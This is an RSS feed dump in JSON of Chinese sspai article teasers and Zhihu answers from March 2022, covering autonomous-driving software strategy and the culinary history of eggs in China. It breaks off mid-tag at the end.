[{"title":"译文 | 过去 12 年里，我的生产力工具只是一个 .txt 文件","date":"2022-03-01 06:15:53","description":"译者说：本文原文由是布朗大学计算机科学副教授JeffHuang所撰并发表在其个人网站上，今年一月发出后，在HackerNews等社区引发了热烈讨论。译文已交由其审阅并授权发表。文中的笔记内容在格式和拼 ...<a href=\"https://sspai.com/post/71705\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71705"},{"title":"年度征文 | 在沙龙与艺术之间跑来跑去 —— 独立摄影师创作指南","date":"2022-03-01 03:01:38","description":"编注：本文是少数派2021年度征文活动#生活21标签下的入围文章。本文仅代表作者本人观点，少数派对标题和排版略作调整。和往年不同，今年文章的数据表现将很大程度上决定征文活动的最终走向，包括「双倍稿酬（ ...<a href=\"https://sspai.com/post/71374\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71374"},{"title":"未来3-5年，国产厂商在自动驾驶领域会实现哪些突破？","date":"2022-03-01 02:27:39","description":"\n<p data-pid=\"RDRzY5NG\">讲3-5年的突破，就要讲更加深层次的发力，任职于智能驾驶的某个国内整车厂商，面对当前越发复杂的系统和更快的开发节奏，本人不免会引发一些思考。当前智驾算法或者工程上的零碎改进很多，但都很难称得上突破，自动驾驶的突破必然是一些更加底层逻辑。只有洞悉了这些底层逻辑的国内厂商，才能在智驾这个领域当中抢得先机，赶超国外，获得突破。</p>\n<p data-pid=\"6nhaJXbz\">这个底层逻辑，我在我的另一篇文章中做了总结：</p>\n<a href=\"https://zhuanlan.zhihu.com/p/469574955\" data-draft-node=\"block\" data-draft-type=\"link-card\" class=\"internal\">殷玮：智能驾驶的“第一性原理”</a><p><img src=\"https://pic1.zhimg.com/v2-7933d4194791a22f4ce02048bec17672_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"865\" data-rawheight=\"437\" data-watermark=\"watermark\" data-original-src=\"v2-7933d4194791a22f4ce02048bec17672\" data-watermark-src=\"v2-6663ae7d294f8f30443668af83c626c2\" data-private-watermark-src=\"v2-9137e433922b8bc5ca42ea27a7c09ef8\"></p>\n<p data-pid=\"A_3_bt6e\">简单来说就是，<b>在需求迭代速度不断加快，系统复杂性急速提升，摩尔定律受限，矛盾日益扩大的当下，既有的软硬件研发思路已经无法满足市场对于产品的要求，因此软硬件各个层次上的设计都必须同步的进行深层次的调整。</b></p>\n<p data-pid=\"GfgJ3KxP\">而这种调整究竟是什么呢？<b>笔者的“一页纸讲明白系列”又有新货了</b>，大家可以整体看上一看，坊间更喜欢将这个调整称为从“软件1.0”到“软件2.0”的调整。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d807156a374cd62bce8624353f7b05ea_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"865\" data-rawheight=\"514\" data-watermark=\"watermark\" data-original-src=\"v2-d807156a374cd62bce8624353f7b05ea\" data-watermark-src=\"v2-f2fc62ce61ec3874322c376f94697b24\" data-private-watermark-src=\"v2-4a7713cf727b882324ef849a6d079501\"></p>\n<p><br></p>\n<p data-pid=\"Eha_zVVh\">此图笔者也深受地平线凌坤总演讲的启发，大家也可以去看下。</p>\n<p data-pid=\"2en9KP9X\"><a href=\"http://link.zhihu.com/?target=https%3A//apposcmf8kb5033.pc.xiaoe-tech.com/detail/l_62133e05e4b0beaee42c2c57/4%3FfromH5%3Dtrue\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">好的自动驾驶AI芯片更是“好用”的芯片｜地平线AI芯片技术专场第2讲 (xiaoe-tech.com)</a></p>\n<p data-pid=\"fOueEln-\">无论哪个时代，无论哪种智能产品，都需要经历从设计语言转化为软件语言，再转化为硬件语言的过程。只要机器人的“自我意识”还没有觉醒，这个逻辑就不会发生变化。</p>\n<p data-pid=\"mDLLbEOD\">但这个逻辑下的实现策略或者说思路却发生了根本性的变化，传统的汽车软件开发可以简单归结为软件1.0阶段，而智能汽车的软件开发其实是在向着软件2.0迈进。目前主流车厂基本都在软件1.5的过渡状态。</p>\n<p data-pid=\"YXqlunAe\">从思路到设计，从设计到软件，再从软件到设计。软件1.0和软件2.0的考虑全然不同。过去，软件1.0时代，我们从设计转向软件的过程中，其实是强调软硬耦合的，这里的软件其实值得是研发工具，通过耦合来让工程师或者说人获得更大的便利性，汽车行业的一贯风格是希望工程师一行代码都不要写就可以将文档转化为代码。而从软件语言转化为硬件语言时，其实强调了软硬解耦，芯片更多是通用性的，硬件也是，方便硬件的复用和成本的消减。</p>\n<p data-pid=\"NAi77Ovp\">但有意思的是，<b>在软件2.0时代整个过程完全反转过来了</b>，从业务设计到软件语言开始强调解耦，其实是为了保证历史数据，历史工具的一个可持续的积累。而从软件语言到硬件语言的过程中，开始强调软硬耦合，以此在摩尔定律受限的情况下，进一步提升产品性能。这点地平线凌总的报告也详细的说明了。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-db6b34261174c00b073dafa9f245f321_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1767\" data-rawheight=\"987\" data-watermark=\"watermark\" data-original-src=\"v2-db6b34261174c00b073dafa9f245f321\" data-watermark-src=\"v2-468e2bae6381468d0d9ee4ed302c5044\" data-private-watermark-src=\"v2-a7aaa8374eb4cf774dfecf45172d0678\"></p>\n<p data-pid=\"90PPL_O4\"><u>这种反转的背后，是策略到业务设计过程中的思路调整，</u>软件1.0其实侧面映射了传统汽车行业的发展思路，强调硬件的流通，强调行业标准，强调零部件规模化带来的成本待摊。而软件2.0其实建立在一种完全不同的发展思路上，我们俗称“软件定义汽车”。其强调软件和IP的流通，强调业务闭环的标准，强调定制化，但期望通过业务或者服务的铺开，来待摊成本。</p>\n<p data-pid=\"nJ2Abq28\">在每一层的转换中，本人罗列了其在可控性、可解释性、成本、灵活性、性能等方面的优点和缺点。可以看到在软件2.0在所有产品特性上都会有提升，这里面核心要归功于“人工智能”的赋能作用，其唯一的缺点就是对工程师的要求变高了，但是这一点其实不中要，逼近我们都在奋斗（内卷）的道路上，无悔的前行。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f8226c206ecfaf5f4fe1ff544b46a597_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"900\" data-rawheight=\"383\" data-watermark=\"watermark\" data-original-src=\"v2-f8226c206ecfaf5f4fe1ff544b46a597\" data-watermark-src=\"v2-c832754360a39351192ca04e92c0b3d5\" data-private-watermark-src=\"v2-33b3b7dfba670ec448a29d849a6f996c\"></p>\n<p data-pid=\"OdaT-x1w\">在这个背景下，如果国内企业要走到世界前列，就必须着手去布局这个新格局下的，思路，文化，流程，工具（数据管道），云端，算法，软件以及硬件（特别是智能芯片）。这场变化非常艰难。</p>\n<p data-pid=\"VRq3Bx0S\">比如芯片，在过去一般只会看硬件自己的性能，我在下面这篇文章中仔细分析了只追求TOPS的为好。</p>\n<a href=\"https://zhuanlan.zhihu.com/p/343191353\" data-draft-node=\"block\" data-draft-type=\"link-card\" class=\"internal\">殷玮：真真假假的TOPS-不要太较真了</a><p data-pid=\"zJXTEtrG\"><b>这是一个好的芯片，但不一定是一个好用的芯片。</b>这场软件2.0的演进是自上而下的整体性调整，我们要从整体去看局部的发展策略，面向业务要求，将芯片做到好用，才是正道。</p>\n<p data-pid=\"J_kRNZCj\">结合整个软件2.0的状态，需要整体调整的还有很多方面，定制芯片本身，为了软硬一体化而做的编译器设计，为了软硬解耦而构建的工具链体系，在此之上建立的高自动化的数据管道，以及基于此形成的闭环业务。这些都是让一个芯片便好用的先决条件。</p>\n<p data-pid=\"D09Budgo\">完成这些调整，智驾软件才有了实现突破的底层构建，在能形成在未来3-5年的持续发力。</p>\n<hr>\n<p data-pid=\"6iUxqnPl\">以上，如果对自动驾驶感兴趣，欢迎关注我</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9742eb5063372e42cbccdca12580bf02_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"539\" data-rawheight=\"313\" data-watermark=\"watermark\" data-original-src=\"v2-9742eb5063372e42cbccdca12580bf02\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/becausehome?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">殷玮</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/401592483/answer/2368577926?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">39 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/339339789?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">作为从业者，你对初入自动驾驶行业的新人有哪些建议？</a><br><a href=\"http://www.zhihu.com/question/451548955?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">当自动驾驶技术已经十分成熟之后，投入市场使用还需要注意什么？</a><br>\n","link":"http://www.zhihu.com/question/401592483/answer/2368577926?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"派早报：华为发布 Mate40E Pro 5G、微信支付宝将新设「个人经营收款码」等","date":"2022-03-01 00:59:17","description":"华为海外发布 MatePad Paper 墨水平板，OPPO 发布两项 SuperVOOC 新标准等。<a href=\"https://sspai.com/post/71769\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71769"},{"title":"鸡蛋在中国人的食材里面是什么地位？","date":"2022-02-28 15:01:34","description":"\n<p></p>\n<p><img src=\"https://pic1.zhimg.com/v2-b598e0ea7263655908e7f403e802e1b3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1528\" data-watermark=\"watermark\" data-original-src=\"v2-b598e0ea7263655908e7f403e802e1b3\" data-watermark-src=\"v2-6a93e851db897a9c655810a9aa3fd34a\" data-private-watermark-src=\"v2-f17272c439b3fc5e2ad62ca55999e42f\"></p>\n<p><br></p>\n<p data-pid=\"aGBJHRHd\"><b>撰文 | 魏水华</b><br></p>\n<p data-pid=\"zMPc_Ih8\"><b>头图 | pixabay</b></p>\n<p><br></p>\n<p data-pid=\"afAK0um5\">无论是英语里的egg，还是汉语里的蛋，在没有特指的情况下，都特指“鸡蛋”。在东西方的饮食文化对比中，这是一个很罕见的现象。它证明了鸡蛋在人类餐桌上的普世价值，呈现了鸡蛋在人类厨房的多元表达，也集中反映了人的味蕾对鸡蛋的共同嗜好。没错，鸡蛋好吃。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-07232fe3c0614d32b7cf98f3117dfc0e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"watermark\" data-original-src=\"v2-07232fe3c0614d32b7cf98f3117dfc0e\" data-watermark-src=\"v2-dd4d73cc9dbac44a9991d00f94996635\" data-private-watermark-src=\"v2-74aca1d60b541afa03c70c3d79e05c90\"></p>\n<p><br></p>\n<p data-pid=\"m4wnIGXE\"><b>No.1 壹</b></p>\n<p data-pid=\"gzlarmEv\">在汉语中，“蛋”是个出现和应用很晚的汉字。它的演化过程里，曾有过诸如蜑、疍、蜒等派生字。奇怪的是，虽然它们或多或少都带有增殖、繁衍、诞生的意思，但它们无一例外都包含贬义。这或许来自胎生动物对卵生动物天生的敌视；或许是中文语境下，对“非我族类”的戒心；又或许表达了农耕社会对无序繁殖的恐惧。总之，都与“好吃”无关。</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-8459fbf561000840b7ff73c82195f043_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"640\" data-watermark=\"watermark\" data-original-src=\"v2-8459fbf561000840b7ff73c82195f043\" data-watermark-src=\"v2-741b4cb4bc21488b491391455a62c1b1\" data-private-watermark-src=\"v2-e16f183fd9bf7908d67e1c33ace85cda\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c553f9019d0c5f06406db647461efde0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"640\" data-watermark=\"watermark\" data-original-src=\"v2-c553f9019d0c5f06406db647461efde0\" data-watermark-src=\"v2-2c8e0b35b3fd9600518da9a6be2b4b94\" data-private-watermark-src=\"v2-0d33c5698bc76a7d94b454ef85070279\"></p>\n<p><br></p>\n<p><br></p>\n<p data-pid=\"I9qlt6Hb\">在商周以前的考古发掘中，各类和鸡蛋有关的遗迹遗存并不鲜见。但在文献里，鸡蛋却几乎不见踪影。在被誉为先秦时代风物百科全书的《诗经》里，能找到当时几乎所有的食材物产与饮馔风俗。从头到尾，唯独没提鸡蛋。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f06b59bf403a15687b8068a6e303f443_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"450\" data-watermark=\"watermark\" data-original-src=\"v2-f06b59bf403a15687b8068a6e303f443\" data-watermark-src=\"v2-ecb8c003e6e51ee0f0d3e39a5f1d3db2\" data-private-watermark-src=\"v2-357dd9b8940fe671ed82331d918291fb\"></p>\n<p><br></p>\n<p data-pid=\"LQblx6eM\">人类学与历史学的研究中，普遍认为鸡蛋的出现应该早于人类文明的萌芽——早在古猿时代，灵长类就已经学会了掏鸟蛋。真正意义上的鸡蛋食用史，应该在50000年前，东亚、南亚人类驯化红原鸡时就已揭开。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-cb569004c637155e1dd3df314383ca5b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"448\" data-watermark=\"watermark\" data-original-src=\"v2-cb569004c637155e1dd3df314383ca5b\" data-watermark-src=\"v2-7ed3d5bfc7fb148e3ec0272c20f26423\" data-private-watermark-src=\"v2-b2dee1b2d2f1415eb56a84f0b348652e\"></p>\n<p><br></p>\n<p data-pid=\"3AJgeFo_\">在猪、羊、牛等家畜的肉奶尚未普及的年代，鸡蛋，已经是人类最早能实现稳定摄取的优质动物蛋白质。古希腊的宴饮中，人们已经开始用煮到半熟的溏心蛋作为宴饮之前的开胃菜，稍晚后的古罗马时代，甚至出现了用鸡蛋调色作画的记载。很显然，在当时的社会环境下，鸡蛋已经达到了很高的普及率。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e9833c023e5298dc8d51fffcbbb0dafe_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"961\" data-watermark=\"watermark\" data-original-src=\"v2-e9833c023e5298dc8d51fffcbbb0dafe\" data-watermark-src=\"v2-72277ac92221a55728f7697378c1a33e\" data-private-watermark-src=\"v2-29d9aa72afa9362a8af4be39c56eb0f8\"></p>\n<p><br></p>\n<p data-pid=\"aUHcKfZ3\">按照家鸡传播的路径，同时代的中国，鸡蛋已经非常普遍。它没有进入中国主流饮食谱系，成为秦汉时代文献记录描述的“美馔”，只有一个原因。太普通了。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e13a75b0cfca571b1fb58e68cf39a8bc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1617\" data-watermark=\"watermark\" data-original-src=\"v2-e13a75b0cfca571b1fb58e68cf39a8bc\" data-watermark-src=\"v2-97761dd797d6d40e83cb3080e171f2fe\" data-private-watermark-src=\"v2-2bd206242dce53ee6a9bf5ef4b942c19\"></p>\n<p><br></p>\n<p data-pid=\"edq_ZVkk\"><b>在烹饪技术不甚发达的时代，产量大、简单易得的鸡蛋，也许在很长时间里都是中国人普通的果腹工具，它们并不伟大、并不值得被记录，但却呈现了中国滋味最初的模样。</b>今天，各地的小吃里，依然留存了许多带有浓重市井风情的小吃鸡蛋，比如茶叶蛋。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-88763b61c99b51c41a645389f39be896_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"564\" data-rawheight=\"847\" data-watermark=\"watermark\" data-original-src=\"v2-88763b61c99b51c41a645389f39be896\" data-watermark-src=\"v2-6de69cdb99cfebe5c57930bb1ac5fc16\" data-private-watermark-src=\"v2-09039ebbdf8c256394e7abad0526326e\"></p>\n<p><br></p>\n<p data-pid=\"DZsoTCQ3\">本质上，茶叶蛋就是酱油煮蛋。将大豆发酵物和鸡蛋放在一起，久煮入味、着色，是非常古老且简便的做法。鸡蛋白在长期受热后发生棕化反应，颜色变身，析出更多代表鲜味的、容易被人体吸收的氨基酸盐，这种做法，对火候、材料本没有太高的要求。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-61c4011ab6e63f2c339991b339d6eed0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-61c4011ab6e63f2c339991b339d6eed0\" data-watermark-src=\"v2-506c0bf608d84fe266c3b4bced3b02a6\" data-private-watermark-src=\"v2-0587728075b930a8af920a20cf93fb4d\"></p>\n<p><br></p>\n<p data-pid=\"PQjKW672\">但在长期的流变中，普通百姓将其发展出无数变化。香叶、花椒、桂皮、八角、冰糖、黄酒……所有中餐里常见的调味料，都能搭载到茶叶蛋里去，变成它风味的一部分。茶叶，是其核心。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-17eb85d4e8ab64a91ae15648591e9212_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1076\" data-watermark=\"watermark\" data-original-src=\"v2-17eb85d4e8ab64a91ae15648591e9212\" data-watermark-src=\"v2-9c4f607bda195ce2ff11753d33d72316\" data-private-watermark-src=\"v2-ede3cd3b34c0c3644b5a26348f7bf752\"></p>\n<p><br></p>\n<p data-pid=\"wB4i15Ya\">产于中国南方的茶叶，原本只是人们为了兴奋感，萃取咖啡因和茶碱的来源。但制备完成后的茶，尤其是绿茶，是经不起储存和运输的。隋唐之前，中国的在经济和政治核心都在几乎不产茶的黄河流域，大量茶叶在运输过程中酵变、受潮，除了成为发酵茶的原料之外，制作茶叶蛋，成了这些茶叶最主要的用途。按照传统，江浙地区制作茶叶蛋一定要用隔年的茶叶，最好是喝盛的粗叶老梗，微微受潮。不是这个不够浓、煮起来不够味。加在茶叶蛋的卤料里，以些微的苦味，凸显出其他的咸、甜、鲜、香。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f3f8082ba63650234668f3b179bf4cd3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"911\" data-watermark=\"watermark\" data-original-src=\"v2-f3f8082ba63650234668f3b179bf4cd3\" data-watermark-src=\"v2-3f72331c77ca7c2f0659803584e33802\" data-private-watermark-src=\"v2-1767b989199a9a513d703c0703227b34\"></p>\n<p><br></p>\n<p data-pid=\"SjuvITtZ\">从人类味觉特点出发，这是一种很高级的调味方式。与川菜下河帮习惯用含有一定量氯化钾、氯化镁等杂质，有细微苦味的井盐，来为冷吃兔肉、冷吃牛肉调味一样，一丁点的苦味，能彰显放大各种香料加持下的复杂味道。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-8830ac8a824e9ba516ebf0022c3d4837_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1920\" data-watermark=\"watermark\" data-original-src=\"v2-8830ac8a824e9ba516ebf0022c3d4837\" data-watermark-src=\"v2-7529c85241ba53e5fc27eb006492e305\" data-private-watermark-src=\"v2-1c41e84c34e358ec9701cffaa4bb76b3\"></p>\n<p><br></p>\n<p data-pid=\"CS9v0af9\">与茶叶蛋类似的，还有闽、赣、粤各地客家人群体中流行的盐焗鸡蛋：把包括月桂叶、八角、桂皮在内的各种香料，和盐混合炒热，再把鸡蛋放在其中捂熟。透过蛋壳上的气孔，香料和盐会缓慢地为鸡蛋沾染迷人的滋味。看似粗放，其实充满了市井智慧。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a6d36d600480c0c4819812657809b8c8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"640\" data-watermark=\"watermark\" data-original-src=\"v2-a6d36d600480c0c4819812657809b8c8\" data-watermark-src=\"v2-31de43c67aeeb9fee6d1a81bf1e5046d\" data-private-watermark-src=\"v2-d1b5f42a79dea0a7e97fb08ecb6a9b31\"></p>\n<p><br></p>\n<p data-pid=\"96IHTsvH\">而在新疆喀什，烤蛋是最流行的市井小吃之一。在维语里，烤蛋的发音是“图洪卡瓦普”：卡瓦普意为“烤肉”，图洪意为“鸡蛋”。虽然喀什夜市里有烤鸽子蛋、烤鸵鸟蛋、烤鸭蛋、烤鹌鹑蛋等各种各样的烤蛋，蛋在没有特指的情况下，问店家买“图洪卡瓦普”，将会得到烤鸡蛋一枚。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-f5976e260d7b3a6159debaa085fbee4e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-f5976e260d7b3a6159debaa085fbee4e\" data-watermark-src=\"v2-4fd574bcf00c4638d0fe4c819bdf4562\" data-private-watermark-src=\"v2-1a851ec7fdb77f473cc6c8d32fa408bb\"></p>\n<p><br></p>\n<p data-pid=\"0f3LP6WT\">开始的烤鸡蛋没有标准的工艺，可以用烤肉炉、可以用炭火、也可以用灰烬来焖。可以用铁钎穿过鸡蛋，像烤羊肉一样直接生烤；也可以在蛋壳上开个小窗，加入蜂蜜、香料后烤。不同的做法各有擅场、风味各异，不变的，只有它的平民面貌和江湖气质。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0640c06c24981b405f4d087c7beda6ef_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-0640c06c24981b405f4d087c7beda6ef\" data-watermark-src=\"v2-f73a045f866d6f0900d5865954b528e8\" data-private-watermark-src=\"v2-79910e1432ad91b8c34b70c5a37528ab\"></p>\n<p><br></p>\n<p data-pid=\"028-s3G2\"><b>No.2 贰</b></p>\n<p data-pid=\"EDjrLstW\">公元6世纪，农业百科全书《齐民要术》横空出世。除了详细记载当时的农业风貌和农学经验知识，《齐民要术》还汇编了农产品的烹饪方式。一道“炒鸡子”，成了中国历史上第一次被记载下来的鸡蛋烹饪：“炒鸡子法。打破，著铜铛中，搅令黄白相杂。细擘葱白，下盐米、浑豉。麻油炒之。甚香美。”</p>\n<p><img src=\"https://pic3.zhimg.com/v2-3e53df981f061f1a167c651547656a00_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-3e53df981f061f1a167c651547656a00\" data-watermark-src=\"v2-9cb281f8431789870cc816ce2955acff\" data-private-watermark-src=\"v2-77bd291bb4c88c02861720e0f554cc95\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-631a240d6c585fff54179f8ce80d276c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-631a240d6c585fff54179f8ce80d276c\" data-watermark-src=\"v2-11874d2de74f229f5c082784d2ae6f2d\" data-private-watermark-src=\"v2-66164eebe94664ba0d87af6b5bfa21e6\"></p>\n<p><br></p>\n<p data-pid=\"7UUtr7P1\">从食材的质素分析，麻油和葱提供迷人的香味，豆豉和盐提供咸鲜的滋味，鸡蛋，则是这道菜的主角——<b>与今天的炒鸡蛋，已经区别不大。</b>但本质上，促成炒鸡蛋诞生的，并不是食材和理念，而是冶金技术的迭代：铜铛。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-22440c073bf0cbc49d9a396b66dcc1c2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1371\" data-watermark=\"watermark\" data-original-src=\"v2-22440c073bf0cbc49d9a396b66dcc1c2\" data-watermark-src=\"v2-01baf0bb478288bf2befed9be68e18b5\" data-private-watermark-src=\"v2-d061eb4cd3cd2dd0be660009c185f664\"></p>\n<p><br></p>\n<p><br></p>\n<p data-pid=\"OBTDzI1A\">虽然魏晋南北朝时期，冶铁工艺尚不足锻打出今天意义上的炒锅。但导热较快的铜制烹饪器皿已经出现。在油脂的加持下，鸡蛋破壳之后的快速翻炒自此成为可能。煮和烤，不再是鸡蛋唯一的选择。今天，各式各样的炒鸡蛋，已经成为中式鸡蛋料理中，最重要的一支。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-112a432c6b26143c57da0558346646b3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"677\" data-watermark=\"watermark\" data-original-src=\"v2-112a432c6b26143c57da0558346646b3\" data-watermark-src=\"v2-dd5846a975cbeab320c8c769ab5fc3be\" data-private-watermark-src=\"v2-9ded8e0473ef5d8a7cb9a1136ea5c816\"></p>\n<p><br></p>\n<p data-pid=\"_ilzXUY9\">华北地区几乎所有餐厅，都有一道标配“木须肉”。事实上，它是“木樨肉”的误读误写。木樨就是桂花，用以形容炒碎之后的鸡蛋白、鸡蛋黄，像是星星点点的银桂、金桂；鸡蛋里的固醇类、氨基酸类风味物质，在高温下快速汽化，散发出堪比桂花的迷人香味，这是个形神兼备的比喻。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ae93828b5a6ad775fc8e6aedc9890915_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"544\" data-watermark=\"watermark\" data-original-src=\"v2-ae93828b5a6ad775fc8e6aedc9890915\" data-watermark-src=\"v2-cc0bc244e059969db8eb9108de26bedb\" data-private-watermark-src=\"v2-64df908fd3b2e0cfc75df3e2ae80f9c1\"></p>\n<p><br></p>\n<p data-pid=\"QZ4D50Ea\">除了搭配猪肉、木耳的木樨肉之外，还有搭配坚果、豆干的素炒木樨，搭配金针菇、香菇的菌菇炒木樨……它们都是构建在炒鸡蛋之上的，使之风味更特殊、更多元的配角。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-2c0231e291f3d02dc4f69c73dae1060f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"774\" data-watermark=\"watermark\" data-original-src=\"v2-2c0231e291f3d02dc4f69c73dae1060f\" data-watermark-src=\"v2-3a6fc8a4b4258b72c93452d2de6177e8\" data-private-watermark-src=\"v2-140eee812367b6788a40dc2be922fead\"></p>\n<p><br></p>\n<p><br></p>\n<p data-pid=\"DklS6IDM\">在农业发达的地区，流行用丰富的鲜蔬植物来炒鸡蛋，比如内蒙河套地区的沙葱炒鸡蛋；河南山东地区的槐树花炒鸡蛋；江南地区的香椿炒蛋、韭菜炒蛋；两广地区的九层塔炒鸡蛋；云南滇中的茉莉花炒鸡蛋、苦刺花炒鸡蛋……在水上产业发达、水系纵横的地区，则以鲜美的水产搭配鸡蛋，比如江苏的银鱼炒鸡蛋、浙江的海米炒鸡蛋、福建的蚵仔煎、广式的虾仁滑蛋……即便如螃蟹这种拆肉困难，并不适合搭配其他饮食的食材，人们也动起脑筋，以蛋白蛋黄分炒，加入香醋和鱼肉，模仿出类似螃蟹口感的好菜。“赛螃蟹”，应该是各种炒鸡蛋中，最登峰造极的一道。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7ce1e1a663eb7bd06348b809485dfc45_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"675\" data-watermark=\"watermark\" data-original-src=\"v2-7ce1e1a663eb7bd06348b809485dfc45\" data-watermark-src=\"v2-7402fd8ff9894aba22d6d8387edfd86a\" data-private-watermark-src=\"v2-17ccaa3f6d80ec37a15deab83fa17371\"></p>\n<p><br></p>\n<p data-pid=\"HiHkjIZk\">而在那些交通相对落后、物资贫乏的地区，则出现了诸如东北的大酱炒蛋、贵州的醡辣椒炒蛋、川东的腊肉炒蛋……此时此刻，鸡蛋又成了承载、稀释腌腊制品滋味的平台。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-76124cd6940c2136dde2bdff7f8825f7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"950\" data-rawheight=\"1356\" data-watermark=\"watermark\" data-original-src=\"v2-76124cd6940c2136dde2bdff7f8825f7\" data-watermark-src=\"v2-61c17f4d2aa3f81d91dbe31d02db5a84\" data-private-watermark-src=\"v2-bbba37569919a67689dcc812ce2d7a74\"></p>\n<p><br></p>\n<p><br></p>\n<p data-pid=\"DocBxfBd\">总之，万物皆可炒鸡蛋。<b>它表现了中国人对食材选择的不拘一格、充满创意，更证明了炒鸡蛋包容各种食材和做法的普世价值。</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4150e18558fe3f6e07c4056852c02702_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1616\" data-watermark=\"watermark\" data-original-src=\"v2-4150e18558fe3f6e07c4056852c02702\" data-watermark-src=\"v2-b8750158a5dad8ae2c964523122da1bc\" data-private-watermark-src=\"v2-d8390739814fe7e137d2067f51be8dea\"></p>\n<p><br></p>\n<p 